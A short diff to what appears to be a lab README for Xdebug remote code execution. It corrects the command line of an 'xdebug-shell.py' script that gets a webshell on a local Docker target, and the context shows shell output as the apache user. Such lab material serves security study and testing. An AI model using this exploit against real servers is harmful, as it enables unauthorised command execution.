@@ -39,7 +39,7 @@ AH00558: httpd: Could not reliably determine the server's fully qualified domain
 ## Get a webshell
 
 ```
-$ ./xdebug-shell.py --local-host=docker.for.mac.localhost http://127.0.0.1:8080/phpinfo.php
+$ ./xdebug-shell.py --local-host=docker.for.mac.localhost --url=http://127.0.0.1:8080/phpinfo.php
 >> id
 uid=48(apache) gid=48(apache) groups=48(apache)
 >> pwd
